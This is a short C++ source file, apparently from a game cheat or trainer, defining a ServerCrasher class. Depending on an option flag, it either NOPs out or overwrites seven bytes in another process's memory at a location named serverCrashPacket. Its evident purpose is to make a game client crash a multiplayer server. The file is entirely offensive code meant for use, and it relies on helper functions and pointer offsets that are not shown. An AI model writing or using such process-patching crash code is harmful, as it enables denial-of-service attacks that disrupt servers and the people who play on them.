#include "servercrasher.h"

ServerCrasher::ServerCrasher(HANDLE hProcess, char option) {
	switch (option) {
	
	case 'N':
		mem::NopEx((BYTE*)pointers::serverCrashPacket(), 7, hProcess);
	break;
	
	case 'F':
		mem::PatchEx((BYTE*)pointers::serverCrashPacket(), (BYTE*)"\xFF\x50\x58\xF2\x0F\x10\x00", 7, hProcess);
	break;
	}
}